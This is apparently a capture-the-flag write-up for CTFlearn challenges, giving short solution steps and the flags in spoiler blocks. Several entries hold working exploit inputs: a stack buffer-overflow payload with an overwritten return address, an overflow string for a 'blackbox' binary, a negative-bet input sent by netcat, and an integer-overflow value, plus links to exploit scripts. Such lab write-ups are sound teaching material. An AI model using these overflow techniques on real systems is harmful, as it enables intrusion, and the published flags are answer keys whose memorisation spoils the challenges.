# Lazy Game Challenge

Trie negative number for the bet like -100000$. And finally it gave me flag.

Or if not, execute this command, it does everything automatically

```sh
printf "Y\n-1000000\n11\n11\n11\n11\n11\n11\n11\n11\n11\n11\n" | nc thekidofarcrania.com 10001
```

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{d9029a08c55b936cbc9a30_i_wish_real_betting_games_were_like_this!}
``
</details>

# Simple bof

Use [python scripts](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/scripts/simplebof.py)

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{buffer_0verflows_4re_c00l!}
``
</details>

# Favorite Color

Connect to the server `ssh color@104.131.79.111 -p 1001`
Entry the password `guest`

Now you are connect, if you entry `ls -la`, you see a file color.c

So fire the command to buffer overflow on the binary to gain acces to the flag file 

```sh
(python2 -c 'print "a"*52+"W\x86\x04\x08"';cat) | ./color
```

And if you have buffer overflow, you have just a `cat flag.txt` to get the flag

<details>
<summary markdown="span">Answer</summary>

flag :``
flag{c0lor_0f_0verf1ow}
``
</details>

# RIP my bof

Use [python scripts](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/scripts/ripbof.py)

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{c0ntr0ling_r1p_1s_n0t_t00_h4rd_abjkdlfa}
``
</details>

# Blackbox

Fire the command to string overflow on the binary to get the flag

```sh
python -c "print '11111111111111111111111111111111111111111111111111111111111111111111111111111111\x02\x00\x00\x00'" | ./blackbox
```

<details>
<summary markdown="span">Answer</summary>

flag :``
flag{0n3_4lus_1_1s_Tw0_dumm13!!}
``
</details>

# Cryptoversing

Xor `h_bO}EcDOR` with `0x10`  and `+G)uh(jl,vL` with `0x18` on [Cryptii](https://cryptii.com/) from Bitwise operation 

<details>
<summary markdown="span">Full explanation</summary>

[here](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/explanation_cryptoversing.md)
</details>

<details>
<summary markdown="span">Answer</summary>

flag :``
xOr_mUsT_B3_1mp0rt4nT
``
</details>

# Shell time!

Use [python scripts](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/scripts/shell.py)

Execute

```sh
python3 shell.py thekidofarcrania.com 4902
```

Write `cat flag2.txt` to get the flag

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{c0ngrat1s_0n_th1s_sh3ll!_SKDJLSejf}
``
</details>

# Jenny

Check [youtube video](https://www.youtube.com/watch?v=no00Ec3YxXc)

<details>
<summary markdown="span">Answer</summary>

flag :``
N0w_1_kn0w_wh0_jen1_1s!11JNI_IS_SO_COOL!
``
</details>

# Libraries

Use [c scripts](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/scripts/fakelib.c) and [makefile](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/scripts/fake.mk)

<details>
<summary markdown="span">Answer</summary>

flag :``
CTF{JN1_1s_r3a77y_f4n!}
``
</details>

# Poor Login

Use [python scripts](https://github.com/GuillaumeDupuy/CTF/blob/main/CTFLearn/scripts/login.py)

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{I_sh0uldve_done_a_ref_counter!!_:PPPPP}
``
</details>

# Accumulator 

Write ``2147483647`` and after ``1``

<details>
<summary markdown="span">Answer</summary>

flag :``
CTFlearn{n3x7_7yp3_0f_0v3rf0w}
``
</details>